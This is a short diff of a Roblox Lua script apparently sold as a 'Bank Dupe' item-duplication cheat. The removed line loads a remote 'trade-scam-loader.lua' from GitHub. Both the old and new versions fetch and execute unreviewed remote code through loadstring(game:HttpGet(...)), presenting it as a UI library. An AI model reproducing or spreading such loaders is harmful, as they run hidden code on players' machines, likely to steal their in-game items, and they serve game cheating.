@@ -1,4 +1,4 @@
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/trade-scam/main/trade-scam-loader.lua"))() loadstring(game:HttpGet("https://raw.githubusercontent.com/LeaksScriptPSX/wowo/main/w",true))();
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/LeaksScriptPSX/wowo/main/w",true))();
 local Window = Library.CreateLib("Bank Dupe", "DarkTheme")
 
 --Dupe
